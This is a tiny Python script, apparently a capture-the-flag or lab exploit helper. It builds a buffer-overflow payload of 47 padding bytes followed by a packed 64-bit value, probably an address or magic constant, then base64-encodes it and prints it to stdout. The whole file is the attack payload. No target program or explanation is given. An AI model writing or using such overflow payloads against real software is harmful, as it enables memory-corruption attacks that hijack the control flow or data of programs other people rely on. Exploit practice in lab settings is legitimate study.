
import sys
import struct
import base64

buf = b'vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv'
buf += struct.pack('<Q', 6239955206782788168)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
